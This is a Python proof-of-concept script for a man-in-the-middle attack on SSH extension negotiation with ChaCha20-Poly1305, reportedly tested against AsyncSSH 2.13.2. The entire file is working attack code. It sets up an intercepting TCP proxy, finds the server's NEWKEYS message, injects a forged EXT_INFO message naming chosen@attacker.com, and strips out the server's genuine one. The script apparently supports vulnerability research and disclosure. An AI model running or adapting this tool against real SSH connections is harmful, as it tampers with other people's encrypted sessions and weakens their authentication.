#!/usr/bin/python3
from binascii import unhexlify
import socket
from threading import Thread

import click

#####################################################################################
## Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ##
##                                                                                 ##
## Client(s) tested: AsyncSSH 2.13.2 (simple_client.py example)                    ##
## Server(s) tested: AsyncSSH 2.13.2 (simple_server.py example)                    ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

@click.command()
@click.option("--proxy-ip", default="0.0.0.0", help="The interface address to bind the TCP proxy to.")
@click.option("--proxy-port", default=22, help="The port to bind the TCP proxy to.")
@click.option("--server-ip", help="The IP address where the AsyncSSH server is running.")
@click.option("--server-port", default=22, help="The port where the AsyncSSH server is running.")
def cli(proxy_ip, proxy_port, server_ip, server_port):
    print("--- Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ---", flush=True)
    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_socket.bind((proxy_ip, proxy_port))
    mitm_socket.listen(5)

    print(f"[+] MitM Proxy started. Listening on {(proxy_ip, proxy_port)} for incoming connections...", flush=True)

    try:
        while True:
            client_socket, client_addr = mitm_socket.accept()
            print(f"[+] Accepted connection from: {client_addr}", flush=True)
            print(f"[+] Establishing new server connection to {(server_ip, server_port)}.", flush=True)
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((server_ip, server_port))
            print("[+] Spawning new forwarding threads to handle client connection.", flush=True)
            Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
            Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
    except KeyboardInterrupt:
        client_socket.close()
        server_socket.close()
        mitm_socket.close()

# Length of the individual messages
NEW_KEYS_LENGTH = 16
SERVER_EXT_INFO_LENGTH = 676

newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
def contains_newkeys(data):
    return newkeys_payload in data

# EXT_INFO message containing server-sig-algs extension with a single algorithm chosen@attacker.com
rogue_ext_info = unhexlify('000000380807000000010000000F7365727665722D7369672D616C67730000001363686F73656E4061747461636B65722E636F6D0000000000000000')
def insert_rogue_ext_info(data):
    newkeys_index = data.index(newkeys_payload)
    # Insert rogue authentication request and remove SSH_MSG_EXT_INFO
    return data[:newkeys_index] + rogue_ext_info + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:]

def forward_client_to_server(client_socket, server_socket):
    try:
        while True:
            client_data = client_socket.recv(4096)
            if len(client_data) == 0:
                break
            server_socket.send(client_data)
    except ConnectionResetError:
        print("[!] Client connection has been reset. Continue closing sockets.", flush=True)
    print("[!] forward_client_to_server thread ran out of data, closing sockets!", flush=True)
    client_socket.close()
    server_socket.close()

def forward_server_to_client(client_socket, server_socket):
    try:
        while True:
            server_data = server_socket.recv(4096)
            if contains_newkeys(server_data):
                print("[+] SSH_MSG_NEWKEYS sent by server identified!", flush=True)
                if len(server_data) < NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
                    print("[+] server_data does not contain all messages sent by the server yet. Receiving additional bytes until we have 692 bytes buffered!", flush=True)
                while len(server_data) < NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
                    server_data += server_socket.recv(4096)
                print(f"[d] Original server_data before modification: {server_data.hex()}", flush=True)
                server_data = insert_rogue_ext_info(server_data)
                print(f"[d] Modified server_data with rogue extension info: {server_data.hex()}", flush=True)
            if len(server_data) == 0:
                break
            client_socket.send(server_data)
    except ConnectionResetError:
        print("[!] Target connection has been reset. Continue closing sockets.", flush=True)
    print("[!] forward_server_to_client thread ran out of data, closing sockets!", flush=True)
    client_socket.close()
    server_socket.close()

if __name__ == '__main__':
    cli()
